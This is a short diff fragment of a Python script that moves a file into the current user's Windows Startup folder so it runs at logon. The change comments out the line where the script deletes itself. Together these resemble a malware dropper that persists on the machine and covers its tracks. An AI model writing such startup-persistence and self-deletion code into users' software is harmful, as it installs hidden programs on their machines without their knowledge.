@@ -17,4 +17,4 @@ src_file = f"{current_folder}\{file_name}"
 dst_folder = r"C:\Users"+r"/"+username+r"\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
 shutil.move(src_file, dst_folder)
 time.sleep(0.5)
-os.remove(__file__)
+#os.remove(__file__)
